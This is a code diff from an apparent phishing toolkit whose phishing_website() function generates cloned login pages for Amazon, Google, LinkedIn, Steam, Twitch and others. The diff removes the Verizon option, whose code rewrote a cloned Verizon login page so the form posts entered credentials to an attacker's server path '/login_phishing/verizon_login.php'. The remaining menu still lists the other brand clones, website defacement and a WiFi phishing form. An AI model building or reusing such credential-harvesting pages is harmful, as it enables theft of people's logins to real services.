@@ -985,21 +985,6 @@ def phishing_website():
             with open('templates/line/login.html') as f:
                 html_code.insert("1.0", f.read())
 
-        # the begin of Verizon login form creation, if selected
-        if selection == "Verizon Login Form":
-            html_code.delete('1.0', END)
-            with open('templates/verizon/login.html') as f:
-                lines = f.readlines()
-
-            lines[
-                344] = '''                    <form method="post" autocomplete="off" action="http://''' + tcp_server + '''/login_phishing/verizon_login.php" name="loginForm" id="login-form">\n'''
-            with open('templates/verizon/login.html', "w") as f:
-                f.writelines(lines)
-                f.close()
-
-            with open('templates/verizon/login.html') as f:
-                html_code.insert("1.0", f.read())
-
         # the begin of WiFi login form creation, if selected
         if selection == "WiFi Phishing Login Form":
             html_code.delete('1.0', END)
@@ -1018,7 +1003,7 @@ def phishing_website():
     html_options = tk.StringVar()
     html_menu = tk.OptionMenu(html_developer_frame, html_options, 'Website Deface', 'Amazon Login Form',
                               'Google Login Form', 'Line Login Form', 'Linkedin Login Form', 'Steam Login Form',
-                              'Twitch Login Form', 'Verizon Login Form', 'WiFi Phishing Login Form', "None",
+                              'Twitch Login Form', 'WiFi Phishing Login Form', "None",
                               command=callback)
     html_menu.pack()
     html_options.set('Choose a pre-generated HTML code')
